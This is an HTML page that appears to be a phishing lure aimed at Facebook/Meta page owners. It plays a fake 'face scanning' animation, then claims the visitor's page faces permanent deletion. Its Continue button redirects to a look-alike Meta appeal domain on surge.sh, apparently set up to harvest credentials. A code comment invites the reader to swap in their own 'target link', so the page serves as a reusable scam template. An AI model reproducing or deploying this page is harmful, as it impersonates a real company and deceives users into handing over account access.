<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>
      Face Verification
    </title>
    <style>
      body {
            margin: 0;
            padding: 0;
            background: linear-gradient(to bottom, #f9f9f9, #e6e6e6);
            font-family: &#39;Segoe UI&#39;, Roboto, sans-serif;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            background: white;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }

        .scanner-ring {
            width: 180px;
            height: 180px;
            border-radius: 50%;
            background: conic-gradient( #4caf50, #2196f3, #ff9800, #f44336, #4caf50);
            animation: spin 2s linear infinite;
            margin: 0 auto 24px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .scanner-core {
            width: 130px;
            height: 130px;
            background: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 54px;
            color: #28a745;
        }

        .scanner-complete {
            animation: none;
            background: #e8f5e9;
            border: 3px solid #28a745;
        }

        .status-message {
            font-size: 18px;
            color: #333;
            margin-bottom: 12px;
        }

        .verified-message {
            display: none;
            font-size: 20px;
            font-weight: bold;
            color: #2e7d32;
            margin-top: 10px;
        }

        .continue-button {
            display: none;
            margin-top: 25px;
            padding: 12px 28px;
            background-color: #1976d2;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.3s ease;
        }

        .continue-button:hover {
            background-color: #125ea4;
        }

        @keyframes spin {
            0% {
                transform: rotate(0);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="scanner-ring" id="scannerRing">
        <div class="scanner-core" id="scannerCore">
        </div>
      </div>
      <div class="status-message" id="statusText">
        Scanning your face securely...
      </div>
      <div class="verified-message" id="verifiedText">
        Your page is at risk of permanent deletion — submit an appeal now
      </div>
      <button class="continue-button" id="continueBtn">
        Continue
      </button>
    </div>
    <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-confirmation-tone-2867.mp3" preload="auto">
    </audio>
    <script>
      const redirectURL = &#34;https://meta-violation-terms-appeal.surge.sh&#34;; // Replace this with your target link

        setTimeout(() =&gt; {
            // Play sound
            document.getElementById(&#34;successSound&#34;).play();

            // Update ring
            const ring = document.getElementById(&#34;scannerRing&#34;);
            const core = document.getElementById(&#34;scannerCore&#34;);
            ring.classList.add(&#34;scanner-complete&#34;);
            core.textContent = &#34;✔&#34;;

            // Update text and button
            document.getElementById(&#34;statusText&#34;).style.display = &#34;none&#34;;
            document.getElementById(&#34;verifiedText&#34;).style.display = &#34;block&#34;;
            document.getElementById(&#34;continueBtn&#34;).style.display = &#34;inline-block&#34;;
        }, 3500);

        document.getElementById(&#34;continueBtn&#34;).addEventListener(&#34;click&#34;, () =&gt; {
            window.location.href = redirectURL;
        });
    </script>
  </body>
</html>
